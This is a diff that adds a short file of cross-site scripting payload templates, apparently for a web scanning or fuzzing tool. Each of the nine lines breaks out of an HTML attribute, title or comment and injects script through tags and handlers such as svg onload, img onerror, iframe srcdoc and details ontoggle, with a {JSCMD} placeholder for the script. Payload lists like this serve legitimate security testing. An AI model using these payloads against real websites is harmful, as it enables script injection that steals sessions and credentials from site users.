@@ -1,0 +1,9 @@
+"><svg/onload={JSCMD}//
+"><svg onload={JSCMD}><script/</svg>
+"><script>{JSCMD}</script>
+"><iframe srcdoc="<script>{JSCMD}</script>">
+"><img src=x onerror={JSCMD}>
+"><details open ontoggle={JSCMD}>
+</title><script>{JSCMD}</script>
+<x onmouseover={JSCMD} />
+--> <script>{JSCMD}</script>
